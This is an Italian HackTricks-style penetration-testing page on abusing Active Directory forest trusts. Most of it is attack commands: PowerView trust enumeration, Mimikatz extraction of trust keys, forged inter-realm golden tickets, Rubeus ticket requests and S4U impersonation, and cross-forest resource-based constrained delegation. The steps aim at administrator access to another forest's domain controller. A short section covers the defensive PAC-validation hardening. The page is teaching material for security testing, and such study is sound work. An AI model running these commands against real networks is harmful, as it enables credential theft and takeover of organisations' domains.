# Dominio di Foresta Esterno - OneWay (Inbound) o bidirezionale

{{#include ../../banners/hacktricks-training.md}}

In questo scenario un dominio esterno si fida di te (o entrambi si fidano l'uno dell'altro), quindi puoi ottenere una qualche forma di accesso su di esso.

## Enumerazione

Prima di tutto, devi **enumerare** la **relazione di trust**:
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*` ti permettono di vedere rapidamente se i percorsi di abuso cross-forest (RBCD, SIDHistory) sono probabilmente efficaci senza prerequisiti aggiuntivi.

Nella enumerazione precedente è stato rilevato che l'utente **`crossuser`** è membro del gruppo **`External Admins`**, che ha **Admin access** nel **DC del dominio esterno**.

## Accesso iniziale

Se **non sei riuscito** a trovare alcun accesso **speciale** del tuo utente nell'altro dominio, puoi comunque tornare alla AD Methodology e provare a **privesc from an unprivileged user** (cose come kerberoasting, per esempio):

Puoi usare le **funzioni di Powerview** per **enumerare** l'**altro dominio** usando il parametro `-Domain` come in:
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Impersonation

### Accesso

Usando un metodo normale con le credenziali degli utenti che hanno accesso al dominio esterno dovresti poter accedere a:
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID History Abuse

Potresti anche abusare di [**SID History**](sid-history-injection.md) attraverso un trust di foresta.

Se un utente viene migrato **da una foresta all'altra** e **SID Filtering non è abilitato**, diventa possibile **aggiungere un SID dall'altra foresta**, e questo **SID** verrà **aggiunto** al **token dell'utente** quando si autentica **attraverso il trust**.

> [!WARNING]
> Come promemoria, puoi ottenere la chiave di firma con
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

Potresti **firmare con** la **chiave trusted** un **TGT che impersona** l'utente del dominio corrente.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Metodo completo per impersonare l'utente
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Cross-forest RBCD quando controlli un account macchina nella foresta fidata (no SID filtering / selective auth)

Se il tuo principale esterno (FSP) ti inserisce in un gruppo che può scrivere oggetti computer nella foresta fidata (es., `Account Operators`, custom provisioning group), puoi configurare **Resource-Based Constrained Delegation** su un host di destinazione di quella foresta e impersonare qualsiasi utente lì:
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
Questo funziona solo quando **SelectiveAuthentication is disabled** e **SID filtering** non rimuove il tuo controlling SID. È un percorso laterale rapido che evita il forging di SIDHistory ed è spesso trascurato nelle revisioni dei trust.

### Indurimento della validazione PAC

Gli aggiornamenti alla validazione della firma PAC per **CVE-2024-26248**/**CVE-2024-29056** aggiungono l'applicazione della firma sui ticket inter-forest. In **Compatibility mode**, percorsi PAC/SIDHistory/S4U inter-realm falsificati possono ancora funzionare su DC non patchati. In **Enforcement mode**, dati PAC non firmati o manomessi che attraversano un forest trust vengono rifiutati a meno che non si possieda anche la chiave di trust del forest di destinazione. Le override del registro (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) possono indebolire questo comportamento fintanto che sono disponibili.



## Riferimenti

- [Microsoft KB5037754 – PAC validation changes for CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [MS-PAC spec – SID filtering & claims transformation details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
